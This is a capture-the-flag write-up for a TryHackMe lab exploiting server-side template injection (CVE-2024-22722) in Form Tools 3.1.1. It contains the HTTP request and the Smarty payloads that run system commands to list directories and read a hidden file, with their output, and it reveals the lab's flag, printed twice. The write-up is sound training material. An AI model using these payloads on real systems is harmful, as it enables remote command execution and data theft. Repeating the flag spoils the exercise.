---
title: Server-side Template Injection
description: Exploit various templating engines that lead to SSTI vulnerability.
---
https://tryhackme.com/room/serversidetemplateinjection

Labs from the TryHackMe's **Server-side Template Injection**  room. 
## Extra-Mile Challenge
### Challenge

Another web app is running on [http://ssti.thm:8080/](http://ssti.thm:8080/). Can you achieve RCE and read the content of the hidden text file in the directory using SSTI?  
**Login credentials:**

- **Username**: admin
- **Password**: admin

## Discovery
Login into using the provided credentials. The web application is built from "Form Tools". 
![](../../../../public/images/THM_SSTI_20250608%20_140015.png)

### Web Footprinting
- Tech Stack: PHP
- Web Server: Apache
- CMS/Tool: Form Tools 3.1.1

### Vulnerabilities
- Form tools 3.1.1
- [CVE-2024-22722](https://nvd.nist.gov/vuln/detail/cve-2024-22722): Server Side Template Injection (SSTI) vulnerability in Form Tools 3.1.1 allows attackers to run arbitrary commands via the Group Name field under the add forms section of the application.


## Exploit
hakai security has documented the details of exploit in this [post](https://hakaisecurity.io/error-404-your-security-not-found-tales-of-web-vulnerabilities/)

1. Login as an administrator and create a form at http://ssti.thm:8080/admin/forms/add/internal.php
![](../../../../public/images/THM_SSTI_20250608%20_140408.png)
2. Add a New group at http://ssti.thm:8080/admin/forms/edit/index.php?form_id=3&page=views using `{{7*7}}`. "create group" request:
```http
POST /global/code/actions.php HTTP/1.1
Host: ssti.thm:8080
Content-Length: 55
X-Requested-With: XMLHttpRequest
Accept-Language: en-GB,en;q=0.9
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Origin: http://ssti.thm:8080
Referer: http://ssti.thm:8080/admin/forms/edit/index.php?form_id=3&page=views
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=tr1cmpj0l16vnci0obe09dm2i9
Connection: keep-alive

group_name=%7B%7B7*7%7D%7D&action=create_new_view_group
```
3. Click "Update" after group is created. ![](../../../../public/images/THM_SSTI_20250608%20_141015.png)
4. The command executed and return `49` ![](../../../../public/images/THM_20250608%20_141044.png)
5. Testing with string {{exec(‘id’)}} returns an error. Shows the template engine is smarty 
```
**Fatal error**: in **/var/www/html/vendor/smarty/smarty/libs/sysplugins/smarty_internal_templatecompilerbase.php** on line **1**
```

```php
{$smarty.version}
```

![](../../../../public/images/THM_SSTI_20250608%20_171653.png)

6. Running SSTI payloads to find hidden files with flag:
```php
{system('ls')} → index.php page_edit_email.php page_edit_view.php page_email_settings.php page_emails.php page_fields.php page_main.php page_public_form_omit_list.php page_public_view_omit_list.php page_views.php
```

```php
{system('ls ..')} → add delete_form.php edit edit_submission.php index.php option_lists submissions.php submissions.php
```

```php
{system('ls ../../')} → account clients forms index.php modules redirect.php settings themes themes
```

Found file with possible flag: `105e15924c1e41bf53ea64afa0fa72b2.txt`
```php
{system('ls ../../')} → 105e15924c1e41bf53ea64afa0fa72b2.txt LICENSE.txt admin cache clients error.php forget_password.php global index.php install modules process.php react themes upload vendor vendor
```

Payload
```php
{system('cat ../../../105e15924c1e41bf53ea64afa0fa72b2.txt')}
```

![](../../../../public/images/THM_SSTI_20250608%20_180045.png)

**Flag:** `THM{w0rK1Ng_sST1}THM{w0rK1Ng_sST1}`